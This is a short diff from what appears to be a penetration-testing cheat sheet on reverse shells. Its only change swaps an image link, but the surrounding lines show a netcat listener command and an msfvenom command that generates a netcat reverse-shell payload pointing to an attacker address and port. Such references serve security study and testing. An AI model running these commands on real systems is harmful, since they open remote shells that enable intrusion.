@@ -37,7 +37,7 @@ nc -u -lvp 4242
   * `Reverse shell command without quotes` 
     * `msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.137.141 LPORT=8888 R`
 
-![](../../.gitbook/assets/image%20%2896%29.png)
+![](../../.gitbook/assets/image%20%2897%29.png)
 
 ## PHP
 
